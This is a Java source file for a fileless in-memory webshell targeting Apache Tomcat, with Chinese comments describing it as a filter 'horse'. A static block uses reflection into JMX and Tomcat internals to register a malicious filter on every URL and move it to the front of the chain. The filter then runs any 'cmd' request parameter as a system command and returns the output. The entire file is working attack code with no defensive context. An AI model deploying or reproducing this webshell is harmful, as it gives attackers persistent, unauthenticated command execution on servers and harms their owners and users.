package com.reinject.MyFilter;

import com.sun.jmx.mbeanserver.NamedObject;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import javax.management.MBeanServer;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

/**
 * @author REInject
 */
//@WebFilter(filterName = "TomcatShellFilter", urlPatterns = "/*", description = "TOMCAT Filter Shell")
public class TomcatShellFilter implements Filter {

    /**
     * webshell命令参数名
     */
    private final String cmdParamName = "cmd";
    /**
     * 建议针对相应业务去修改filter过滤的url pattern
     */
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "xxxxx";

    static {
        try {
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            // 获取mbsInterceptor
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);
            // 获取repository
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Object repository = field.get(mbsInterceptor);
            // 获取domainTb
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap<String, Map<String, NamedObject>> domainTb = (HashMap<String,Map<String,NamedObject>>)field.get(repository);
            // 获取domain
            NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get("context=/,host=localhost,name=NonLoginAuthenticator,type=Valve");
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            Object object = field.get(nonLoginAuthenticator);
            // 获取resource
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            Object resource = field.get(object);
            // 获取context
            field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
            field.setAccessible(true);
            StandardContext standardContext = (StandardContext) field.get(resource);
            // 获取servletContext
            field = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            field.setAccessible(true);
            ServletContext servletContext = (ServletContext) field.get(standardContext);

            if (standardContext != null) {
                //修改状态，要不然添加不了
                java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
                        .getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                //创建一个自定义的Filter马
                Filter threedr3am = new TomcatShellFilter();
                //添加filter马
                javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
                        .addFilter(filterName, threedr3am);
                filterRegistration.setInitParameter("encoding", "utf-8");
                filterRegistration.setAsyncSupported(false);
                filterRegistration
                        .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                new String[]{filterUrlPattern});
                //状态恢复，要不然服务不可用
                if (stateField != null) {
                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
                }

                if (standardContext != null) {
                    //生效filter
                    Method filterStartMethod = org.apache.catalina.core.StandardContext.class
                            .getMethod("filterStart");
                    filterStartMethod.setAccessible(true);
                    filterStartMethod.invoke(standardContext, null);

                    Class ccc = null;
                    try {
                        ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    } catch (Throwable t){}
                    if (ccc == null) {
                        try {
                            ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                        } catch (Throwable t){}
                    }
                    //把filter插到第一位
                    Class c = Class.forName("org.apache.catalina.core.StandardContext");
                    Method m = c.getMethod("findFilterMaps");
                    Object[] filterMaps = (Object[]) m.invoke(standardContext);
                    Object[] tmpFilterMaps = new Object[filterMaps.length];
                    int index = 1;
                    for (int i = 0; i < filterMaps.length; i++) {
                        Object o = filterMaps[i];
                        m = ccc.getMethod("getFilterName");
                        String name = (String) m.invoke(o);
                        if (name.equalsIgnoreCase(filterName)) {
                            tmpFilterMaps[0] = o;
                        } else {
                            tmpFilterMaps[index++] = filterMaps[i];
                        }
                    }
                    for (int i = 0; i < filterMaps.length; i++) {
                        filterMaps[i] = tmpFilterMaps[i];
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellFilter doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
